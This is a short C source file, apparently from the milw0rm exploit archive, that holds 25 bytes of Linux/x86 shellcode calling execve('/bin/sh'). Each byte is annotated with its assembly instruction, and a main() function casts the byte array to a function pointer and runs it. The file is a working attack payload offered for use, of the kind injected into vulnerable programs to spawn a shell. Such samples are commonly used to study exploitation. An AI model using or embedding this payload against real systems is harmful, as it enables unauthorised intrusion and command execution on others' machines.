/*
 * (Linux/x86) execve("/bin/sh", ["/bin/sh", NULL])
 * - 25 bytes
 * - xgc@gotfault.net
 *
 */

char shellcode[] =

  "\x31\xc0"                    // xor    %eax, %eax
  "\x50"                        // push   %eax
  "\x68\x2f\x2f\x73\x68"        // push   $0x68732f2f
  "\x68\x2f\x62\x69\x6e"        // push   $0x6e69622f
  "\x89\xe3"                    // mov    %esp, %ebx
  "\x50"                        // push   %eax
  "\x53"                        // push   %ebx
  "\x89\xe1"                    // mov    %esp, %ecx
  "\x31\xd2"                    // xor    %edx, %edx
  "\xb0\x0b"                    // mov    $0xb, %al
  "\xcd\x80";                   // int    $0x80

int main() {

        int (*f)() = (int(*)())shellcode;
        printf("Length: %u\n", strlen(shellcode));
        f();
}

// milw0rm.com [2006-04-03]